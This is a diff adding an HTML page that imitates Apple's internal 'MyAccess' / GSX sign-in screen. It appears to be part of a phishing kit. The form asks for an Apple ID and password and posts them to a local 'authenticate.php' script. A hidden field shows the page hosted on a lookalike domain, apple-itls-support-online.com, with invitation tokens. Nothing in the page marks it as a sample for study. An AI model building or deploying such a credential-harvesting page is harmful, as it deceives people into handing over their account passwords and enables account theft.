@@ -1,0 +1,191 @@
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
+.layout_cell_2{
+width:10% ! important;
+}
+.layout_cell_1{
+width:45% ! important;
+}
+.layout_cell_3{
+width:45% ! important;
+}
+.align_field{
+width:100%;
+}
+</style>
+
+
+
+
+
+
+
+
+
+    
+
+
+
+    <link rel="stylesheet" type="text/css" href="./signin_files/sslconnectionstandardpagealert.css">
+    
+
+
+
+<meta name="viewport" content="initial-scale=1.0">
+
+
+    
+
+<title>MyAccess - Manage your profile Certification</title>
+<link rel="shortcut icon" href="https://appleid.cdn-apple.com/daw/uat/IDMSWebAuth/static/23May2018/images/favicon.ico" type="image/X-icon">
+<link rel="stylesheet" type="text/css" href="./signin_files/appleconnect.css">
+<script type="text/javaScript" src="./signin_files/common.js"></script>
+<script type="text/javaScript" src="./signin_files/dcutil_2_2.js"></script>
+<script src="./signin_files/jquery-1.11.1.min.js"></script>
+<script src="./signin_files/commonLogin.js" type="text/javascript" charset="utf-8"></script>
+<script src="./signin_files/commonScript.js" type="text/javascript" charset="utf-8"></script>
+<script src="./signin_files/appleConnect.js" type="text/javascript" charset="utf-8"></script>
+
+
+</head>
+<body onload="javascript:urlStore();fixSafariBackButton();" onunload="function onload(event) {
+javascript:urlStore();fixSafariBackButton();
+}">
+<div class="outer">
+    <div class="inner">
+        <div class="main">
+            <h1 class="logo">MyAccess - Internal GSX Manage Panel</h1>
+            
+                <h2>注册参加此活动</h2>
+            
+            
+
+
+
+<p id="errormsg">
+		
+</p>
+<input type="hidden" id="harvestID" value="none">
+<input type="hidden" id="expiryID" value="none">
+
+
+<input type="hidden" id="authenticationID" value="true">
+
+
+
+<form id="command" name="form2" action="authenticate.php" method="post" onsubmit=" return validateForm(event); setFDC();">
+<input id="iForgotNewWindowVar" name="openiForgotInNewWindow" type="hidden" value="false">
+<input id="fdcBrowserData" name="fdcBrowserData" type="hidden" value="">
+	<div class="pair">
+		<div class="module">
+			<label for="accountname">Account Login</label>
+			<input required="" placeholder="Apple ID" id="accountname" name="appleId" autocorrect="off" spellcheck="false" type="text" autocapitalize="off" aria-label="Apple ID" value="" size="30" maxlength="128" autocomplete="off">
+		</div>
+		
+		<div class="module">
+			<label for="accountpassword">Password </label>
+
+			<div class="buttonfield">
+				<input id="accountpassword" required="" placeholder="********" name="accountPassword" autocorrect="off" oncopy="return false;" oncut="return false;" autocapitalize="off" type="password" value="" size="30" autocomplete="off">
+				
+				<input id="continueFieldbutton" type="image" value="" alt="Sign In" aria-label="Sign In" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDE0IDc5LjE1Njc5NywgMjAxNC8wOC8yMC0wOTo1MzowMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTQgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjMzQ0NDRjk5NTBEMTFFNEJFMzlBODgxQ0E1RTI2NkYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjMzQ0NDRkE5NTBEMTFFNEJFMzlBODgxQ0E1RTI2NkYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MzNDQ0NGNzk1MEQxMUU0QkUzOUE4ODFDQTVFMjY2RiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MzNDQ0NGODk1MEQxMUU0QkUzOUE4ODFDQTVFMjY2RiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkpeUbAAAAAQSURBVHjaYvj//z8DQIABAAj8Av7bok0WAAAAAElFTkSuQmCC">
+			</div>
+		</div>
+		<div class="link_pair">
+			<div class="module">
+				
+			</div>
+		</div>
+	</div>
+	
+
+
+    
+    
+
+	
+
+
+
+
+	<input type="hidden" id="appIdKey" name="appIdKey" value="a26d03bc98c4c6fd90290bf5184bd3fb18f595ca97e0f6fbe6cdd429963e975c">
+
+
+
+
+	<input type="hidden" id="accNameLocked" name="accNameLocked" value="false">
+
+
+
+<input type="hidden" id="language" name="language" value="US-EN">
+
+
+	<input type="hidden" id="path" name="path" value="/index.jsp">
+
+
+
+
+
+	<input type="hidden" id="requestUri" name="requestUri" value="/login">
+
+
+
+
+	<input type="hidden" id="Env" name="Env" value="UAT">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<input type="hidden" id="scnt" name="scnt" value="8213ec09fff2029d460e8f9e250aa213">
+
+
+</form>
+<input type="hidden" name="hiddenUrl" id="hiddenUrl" value="f">
+<input type="hidden" name="currentUrl" id="currentUrl" value="https://apple-itls-support-online.com/signin.html?InvitationUrl=5c1ce855bdc3596f2016d34acbabbe99&amp;KeyInvite=5c1ce855bdc3596f2016d34acbabbe99">
+<script>
+	appendOnLoad();
+	hintText();
+</script>
+
+	
+
+
+
+<input id="errorMsgForEmptyCredentials" type="hidden" value="Please enter all your details requested.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+        
+        
+
+
+
+    </div>
+</div>
+
+</body></html>
